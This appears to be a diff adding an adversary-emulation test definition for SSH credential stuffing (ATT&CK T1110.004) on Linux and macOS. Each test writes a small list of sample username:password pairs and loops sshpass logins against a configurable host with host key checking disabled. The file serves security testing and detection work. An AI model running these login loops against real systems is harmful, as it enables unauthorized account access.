@@ -1,0 +1,84 @@
+---
+attack_technique: T1110.004
+display_name: 'Brute Force: Credential Stuffing'
+
+atomic_tests:
+- name: SSH Credential Stuffing From Linux
+  description: |
+    Using username,password combination from a password dump to login over SSH
+
+  supported_platforms:
+    - linux
+
+  input_arguments:
+    target_host:
+      description: IP Address / Hostname you want to target.
+      type: String
+      default: localhost
+
+  dependency_executor_name: SSHPASS # (optional) The executor for the prereq commands, defaults to the same executor used by the attack commands.
+  dependencies: # (optional)
+    - description: |
+        Requires Installation of SSHPASS
+      prereq_command: | # Commands to check if prerequisites for running this test are met. For the "command_prompt" executor, if any command returns a non-zero exit code, the prerequisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success.
+        if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
+      get_prereq_command: | # Commands to meet this prerequisite or a message describing how to meet this prerequisite.
+        if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then apt update && apt install sshpass -y; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then yum update -y && yum install sshpass -y ; else echo "This test requires sshpass" ; fi ;
+
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      cat > /tmp/usernamepass.txt << EOF
+      john.doe:jonathan123!
+      jane.doe:spongebob402
+      administrator:administrator90
+      admin:admin303&
+      root:toor
+      centos:centos
+      john.smith:summer2019!
+      jane.smith:princesa29
+      EOF
+
+      for unamepass in $(cat /tmp/usernamepass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
+
+
+- name: SSH Credential Stuffing From MacOS
+  description: |
+    Using username,password combination from a password dump to login over SSH
+
+  supported_platforms:
+    - macos
+
+  input_arguments:
+    target_host:
+      description: IP Address / Hostname you want to target.
+      type: String
+      default: localhost
+
+  dependency_executor_name: SSHPASS # (optional) The executor for the prereq commands, defaults to the same executor used by the attack commands.
+  dependencies: # (optional)
+    - description: |
+        Requires Installation of SSHPASS
+      prereq_command: | # Commands to check if prerequisites for running this test are met. For the "command_prompt" executor, if any command returns a non-zero exit code, the prerequisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success.
+        if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
+      get_prereq_command: | # Commands to meet this prerequisite or a message describing how to meet this prerequisite.
+        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)" && brew install hudochenkov/sshpass/sshpass
+
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      cat > /tmp/usernamepass.txt << EOF
+      john.doe:jonathan123!
+      jane.doe:spongebob402
+      administrator:administrator90
+      admin:admin303&
+      root:toor
+      centos:centos
+      john.smith:summer2019!
+      jane.smith:princesa29
+      EOF
+
+      for unamepass in $(cat /tmp/usernamepass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
+
